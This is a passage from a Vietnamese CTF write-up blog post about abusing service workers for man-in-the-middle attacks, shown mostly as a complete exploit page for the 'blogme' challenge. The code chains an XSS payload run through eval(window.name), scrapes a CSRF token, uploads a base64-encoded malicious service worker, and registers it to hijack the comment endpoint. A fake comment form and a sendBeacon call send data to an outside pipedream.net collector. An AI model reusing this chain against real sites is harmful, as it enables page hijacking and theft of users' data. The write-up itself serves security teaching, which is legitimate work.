        &lt;meta http-equiv="refresh" content="0;url=https://THISHTMLFILE" /&gt;
    --&gt;</span>
    <span class="c">&lt;!--
&lt;form id=_cf_translation&gt;&lt;img id=lang-selector name=blobs&gt;&lt;output id=locale&gt;&lt;script&gt;eval(name)&lt;/script&gt;&lt;/output&gt;&lt;/form&gt;&lt;a data-translate=value&gt;&lt;/a&gt;&lt;script src=/cdn-cgi/scripts/zepto.min.js&gt;&lt;/script&gt;&lt;script src=/cdn-cgi/scripts/cf.common.js&gt;&lt;/script&gt;&lt;script src=/cdn-cgi/scripts/cf.common.js&gt;&lt;/script&gt;
--&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">const</span> <span class="nx">EVAL_POSTID</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">8d44702a-dc4b-43f4-8651-0a64bc88fb08</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">SW_FILEID</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">a944179f-b7eb-4297-a3e3-9548feff8918</span><span class="dl">"</span><span class="p">;</span>
        <span class="cm">/*
self.addEventListener('fetch', async (e) =&gt; {
    console.log(e);
    if(e.request.url.includes("/api/comment")) {
        e.respondWith(new Response(new Blob([`

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;

&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no"&gt;
    &lt;title&gt;blogme&lt;/title&gt;
    &lt;link rel="stylesheet" href="/assets/bootstrap/css/bootstrap.min.css"&gt;
    &lt;link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&amp;amp;display=swap"&gt;
    &lt;link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora"&gt;
    &lt;link rel="stylesheet" href="/assets/css/styles.css"&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;nav class="navbar navbar-dark navbar-expand-md textwhite bg-primary text-white navigation-clean"&gt;
        &lt;div class="container"&gt;
            &lt;a class="navbar-brand" href="/"&gt;blogme&lt;/a&gt;
            &lt;button data-bs-toggle="collapse" class="navbar-toggler" data-bs-target="#navcol"&gt;
                &lt;span class="visually-hidden"&gt;Toggle navigation&lt;/span&gt;
                &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;
            &lt;/button&gt;
            &lt;div class="collapse navbar-collapse" id="navcol"&gt;
                &lt;ul class="navbar-nav ms-auto"&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/profile"&gt;Profile&lt;/a&gt;&lt;/li&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/posts"&gt;Your Posts&lt;/a&gt;&lt;/li&gt;
                    &lt;li class="nav-item"&gt;&lt;a class="nav-link" href="/api/logout"&gt;Logout&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/nav&gt;

    &lt;div class="container card bg-secondary mt-5 p-0"&gt;
        &lt;div class="card-header"&gt;&lt;h3 class="m-0"&gt;Comment&lt;/h3&gt;&lt;/div&gt;
        &lt;div class="card-body"&gt;
            &lt;div class="card-text"&gt;Enter your comment below:&lt;/div&gt;
            &lt;form method="POST" action="https://enx4khh4m6jy.x.pipedream.net/"&gt;
                &lt;input class="form-control" type="hidden" name="id" value="7213f554-2b98-422a-8416-7a45d6c716be"&gt;
                &lt;div class="input-group mt-3"&gt;
                    &lt;span class="input-group-text"&gt;Comment&lt;/span&gt;
                    &lt;textarea class="form-control" name="text" rows=3 maxlength=150&gt;&lt;/textarea&gt;
                &lt;/div&gt;
                &lt;input type="hidden" name="_csrf" value="QaJVpRex-Yx3UhVRDCHWKT8GgJwg8P9HkRAM"&gt;
                &lt;button class="btn btn-primary mt-3 float-end" type="submit"&gt;Comment&lt;/button&gt;
            &lt;/form&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    &lt;script src="/assets/bootstrap/js/bootstrap.min.js"&gt;&lt;/scr` + `ipt&gt;
    &lt;script src="/assets/js/jquery.min.js"&gt;&lt;/scr` + `ipt&gt;
    &lt;script src="/assets/js/script.js"&gt;&lt;/scr` + `ipt&gt;
&lt;/body&gt;
&lt;/html&gt;
        `], { type: 'text/html' })));
    }
    return;
});
        */</span>

        <span class="kd">let</span> <span class="nx">stage1</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">data:application/javascript;base64,c2VsZi5hZGRFdmVudExpc3RlbmVyKCdmZXRjaCcsIGFzeW5jIChlKSA9PiB7CiAgICBjb25zb2xlLmxvZyhlKTsKICAgIGlmKGUucmVxdWVzdC51cmwuaW5jbHVkZXMoIi9hcGkvY29tbWVudCIpKSB7CiAgICAgICAgZS5yZXNwb25kV2l0aChuZXcgUmVzcG9uc2UobmV3IEJsb2IoW2AKCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBzaHJpbmstdG8tZml0PW5vIj4KICAgIDx0aXRsZT5ibG9nbWU8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvYXNzZXRzL2Jvb3RzdHJhcC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUxhdG86d2dodEA0MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TG9yYSI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9hc3NldHMvY3NzL3N0eWxlcy5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZGFyayBuYXZiYXItZXhwYW5kLW1kIHRleHR3aGl0ZSBiZy1wcmltYXJ5IHRleHQtd2hpdGUgbmF2aWdhdGlvbi1jbGVhbiI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+YmxvZ21lPC9hPgogICAgICAgICAgICA8YnV0dG9uIGRhdGEtYnMtdG9nZ2xlPSJjb2xsYXBzZSIgY2xhc3M9Im5hdmJhci10b2dnbGVyIiBkYXRhLWJzLXRhcmdldD0iI25hdmNvbCI+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0idmlzdWFsbHktaGlkZGVuIj5Ub2dnbGUgbmF2aWdhdGlvbjwvc3Bhbj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJuYXZiYXItdG9nZ2xlci1pY29uIj48L3NwYW4+CiAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZjb2wiPgogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1zLWF1dG8iPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iLyI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL3Byb2ZpbGUiPlByb2ZpbGU8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj48YSBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ii9wb3N0cyI+WW91ciBQb3N0czwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPjxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iL2FwaS9sb2dvdXQiPkxvZ291dDwvYT48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L25hdj4KCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIgY2FyZCBiZy1zZWNvbmRhcnkgbXQtNSBwLTAiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48aDMgY2xhc3M9Im0tMCI+Q29tbWVudDwvaDM+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC10ZXh0Ij5FbnRlciB5b3VyIGNvbW1lbnQgYmVsb3c6PC9kaXY+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSJodHRwczovL2VueDRraGg0bTZqeS54LnBpcGVkcmVhbS5uZXQvIj4KICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJoaWRkZW4iIG5hbWU9ImlkIiB2YWx1ZT0iNzIxM2Y1NTQtMmI5OC00MjJhLTg0MTYtN2E0NWQ2YzcxNmJlIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIG10LTMiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0Ij5Db21tZW50PC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJ0ZXh0IiByb3dzPTMgbWF4bGVuZ3RoPTE1MD48L3RleHRhcmVhPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IlFhSlZwUmV4LVl4M1VoVlJEQ0hXS1Q4R2dKd2c4UDlIa1JBTSI+CiAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgbXQtMyBmbG9hdC1lbmQiIHR5cGU9InN1Ym1pdCI+Q29tbWVudDwvYnV0dG9uPgogICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2Jvb3RzdHJhcC9qcy9ib290c3RyYXAubWluLmpzIj48L3NjcmAgKyBgaXB0PgogICAgPHNjcmlwdCBzcmM9Ii9hc3NldHMvanMvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JgICsgYGlwdD4KICAgIDxzY3JpcHQgc3JjPSIvYXNzZXRzL2pzL3NjcmlwdC5qcyI+PC9zY3JgICsgYGlwdD4KPC9ib2R5Pgo8L2h0bWw+CiAgICAgICAgYF0sIHsgdHlwZTogJ3RleHQvaHRtbCcgfSkpKTsKICAgIH0KICAgIHJldHVybjsKfSk7</span><span class="dl">"</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">.</span><span class="nx">blob</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="k">async</span> <span class="nx">b</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FormData</span><span class="p">();</span>
                <span class="nx">formData</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">blob</span><span class="dl">"</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="dl">"</span><span class="s2">sw.js</span><span class="dl">"</span><span class="p">);</span>

                <span class="kd">let</span> <span class="nx">pfp</span> <span class="o">=</span> <span class="k">await</span> <span class="p">(</span><span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/profile</span><span class="dl">"</span><span class="p">)).</span><span class="nx">text</span><span class="p">();</span>
                <span class="kd">let</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="sr">/</span><span class="se">\?</span><span class="sr">_csrf=</span><span class="se">(</span><span class="sr">.*</span><span class="se">?)</span><span class="sr">"/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">pfp</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>

                <span class="kd">let</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/upload/?_csrf=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">csrf</span><span class="p">),</span> <span class="p">{</span>
                    <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">body</span><span class="p">:</span> <span class="nx">formData</span>
                <span class="p">});</span>
                <span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://enx4khh4m6jy.x.pipedream.net/</span><span class="dl">"</span><span class="p">,</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">url</span><span class="p">).</span><span class="nx">search</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">));</span>
            <span class="p">});</span>
        <span class="p">};</span>

        <span class="kd">let</span> <span class="nx">stage2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">SW_FILEID</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nb">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">(</span><span class="s2">`https://blogme.be.ax/api/file?id=</span><span class="p">${</span><span class="nx">SW_FILEID</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">scope</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/api/comment</span><span class="dl">'</span>
            <span class="p">});</span>
        <span class="p">};</span>

        <span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">(</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">stage1</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s2">`)("</span><span class="p">${</span><span class="nx">SW_FILEID</span><span class="p">}</span><span class="s2">");`</span><span class="p">;</span>
        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://blogme.be.ax/post/</span><span class="p">${</span><span class="nx">EVAL_POSTID</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><hr /><h2 id="tài-liệu-tham-khảo"><span class="mr-2">Tài liệu tham khảo</span><a href="#tài-liệu-tham-khảo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://www.akamai.com/blog/security/abusing-the-service-workers-api">https://www.akamai.com/blog/security/abusing-the-service-workers-api</a></p><p><a href="https://betterprogramming.pub/man-in-the-middle-attacks-via-javascript-service-workers-52647ac929a2">https://betterprogramming.pub/man-in-the-middle-attacks-via-javascript-service-workers-52647ac929a2</a></p><p><a href="https://brycec.me/posts/corctf_2021_challenges#blogme">https://brycec.me/posts/corctf_2021_challenges#blogme</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/websec/'>WebSec</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/tags/service-worker/" class="post-tag no-text-decoration" >service worker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Service worker và Man-in-the-Middle Attack - to^&amp;url=https://to016.github.io//posts/SWandMITM/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Service worker và Man-in-the-Middle Attack - to^&amp;u=https://to016.github.io//posts/SWandMITM/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://to016.github.io//posts/SWandMITM/&amp;text=Service worker và Man-in-the-Middle Attack - to^" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PHPLFI2RCE/">Các kĩ thuật nâng cao trong khai thác lỗ hổng PHP LFI2RCE</a><li><a href="/posts/angstromctf2022/">AngstromCTF 2022</a><li><a href="/posts/SWandMITM/">Service worker và Man-in-the-Middle Attack</a><li><a href="/posts/noted/">Noted - picoCTF2022</a><li><a href="/posts/31linephp/">31 Line PHP - SPbCTF2021</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/noted/"><div class="card-body"> <em class="timeago small" data-ts="1649084880" > 2022-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Noted - picoCTF2022</h3><div class="text-muted small"><p> Sơ lược về challenge Trang gồm có hai chức năng Login và Register overview1 Tiếp đó ta thể tạo note và gửi link để report. overview2 Phân tích Sau khi thử thì mình nhận thấy có lỗi xss ở đây C...</p></div></div></a></div><div class="card"> <a href="/posts/noCookies/"><div class="card-body"> <em class="timeago small" data-ts="1649398020" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NoCookies - DiceCTF2022</h3><div class="text-muted small"><p> Link challenge https://instancer.mc.ax/no-cookies https://admin-bot.mc.ax/no-cookies Source code Download Sơ lược về trang web overview Sẽ có 2 chức năng: Register -&amp;gt; đăng kí account và ...</p></div></div></a></div><div class="card"> <a href="/posts/nahamconctf2022/"><div class="card-body"> <em class="timeago small" data-ts="1651342200" > 2022-05-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NahamconCTF 2022</h3><div class="text-muted small"><p> Solution for some web challenges solved challenges EXtravagant Upload exp.xml and view it &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;/var/www/flag.t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/sandiegoctf2022/" class="btn btn-outline-primary" prompt="Older"><p>San Diego CTF 2022</p></a> <a href="/posts/PHPLFI2RCE/" class="btn btn-outline-primary" prompt="Newer"><p>Các kĩ thuật nâng cao trong khai thác lỗ hổng PHP LFI2RCE</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "to016/to016.github.io", "data-repo-id": "R_kgDOHGuNaQ", "data-category": "Comments", "data-category-id": "DIC_kwDOHGuNac4CPNhc", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "bottom", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/nguyendt0">Tô Đỉnh Nguyên</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/timing-attack/">timing attack</a> <a class="post-tag" href="/tags/xxe/">xxe</a> <a class="post-tag" href="/tags/cache-probing/">cache probing</a> <a class="post-tag" href="/tags/cookie-bomb/">cookie bomb</a> <a class="post-tag" href="/tags/csrf/">csrf</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/lfi/">lfi</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
